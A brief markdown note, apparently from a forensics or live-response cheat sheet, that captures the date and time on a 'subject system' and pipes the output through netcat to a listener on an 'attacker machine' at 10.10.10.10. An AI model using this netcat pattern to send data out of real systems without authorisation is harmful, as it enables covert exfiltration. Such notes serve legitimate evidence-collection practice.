- - -
## Date / Time : 

One Attacker Machine : 

```
nc -nvlp 4444 -k 
```

On Our Subject System : 

```
date /t | nc -nv 10.10.10.10 4444
time /t | nc -nv 10.10.10.10 4444
```

